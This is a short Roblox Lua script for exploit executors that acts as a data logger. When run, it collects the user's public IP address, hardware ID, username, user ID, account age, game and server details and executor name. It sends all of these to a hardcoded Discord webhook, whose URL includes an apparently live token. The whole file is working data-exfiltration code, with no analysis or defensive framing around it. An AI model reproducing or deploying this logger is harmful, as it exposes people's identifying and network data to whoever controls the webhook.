--[[
    obfuscated
]]--

-- Services
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local Stats = game:GetService("Stats")

-- Variables
local LP = Players.LocalPlayer
local Webhook_URL = "https://discord.com/api/webhooks/1477895410042404884/ILyV6UZVBJkaqmTNoOL2I94caeugCiIjmW5dYiRNkG2JZV-ZWX72zeHTA3TJT6xghmDX"
local Request = (syn and syn.request) or (http and http.request) or http_request or request

-- 1. Fetch IP Address
local successIP, ipAddress = pcall(function()
    return game:HttpGet("https://api.ipify.org")
end)
if not successIP then ipAddress = "Failed to fetch" end

-- 2. Fetch HWID (Hardware ID)
local hwid = "Unsupported Executor"
if gethwid then
    hwid = gethwid()
elseif (syn and syn.gethwid) then
    hwid = syn.gethwid()
end

-- 3. Game & Server Info
local gameName = "Unknown"
pcall(function()
    gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
end)

local activePlayers = #Players:GetPlayers()
local maxPlayers = Players.MaxPlayers
local ping = "0"
pcall(function()
    ping = string.split(Stats.Network.ServerStatsItem["Data Ping"]:GetValueString(), " ")[1]
end)

-- 4. Account Info
local accountAge = LP.AccountAge
local creationDate = os.date("%x", os.time() - (accountAge * 86400))

-- 5. Executor Info
local execName = "Unknown"
if identifyexecutor then
    execName = identifyexecutor()
end

-- Prepare the Data Packet
local data = {
    ["content"] = "@here",
    ["embeds"] = {{
        ["title"] = "🚀 Script Executed",
        ["color"] = 0x7289DA, -- Discord Blue
        ["fields"] = {
            {["name"] = "👤 User Info", ["value"] = "**User:** " .. LP.Name .. "\n**ID:** " .. LP.UserId .. "\n**Age:** " .. accountAge .. " days", ["inline"] = true},
            {["name"] = "🎮 Game Info", ["value"] = "**Game:** " .. gameName .. "\n**Players:** " .. activePlayers .. "/" .. maxPlayers .. "\n**Ping:** " .. ping .. "ms", ["inline"] = true},
            {["name"] = "🌐 Network", ["value"] = "**IP:** " .. ipAddress .. "\n**HWID:** " .. hwid, ["inline"] = false},
            {["name"] = "🛠️ Executor", ["value"] = execName, ["inline"] = true},
            {["name"] = "📅 Date/Time", ["value"] = os.date("%Y-%m-%d | %H:%M:%S"), ["inline"] = true}
        },
        ["footer"] = {["text"] = "Logger v2.0 | obfuscated @ discord.gg/25ms"}
    }}
}

-- Send to Discord
if Request then
    Request({
        Url = Webhook_URL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(data)
    })
else
    warn("Executor does not support HTTP requests.")
end
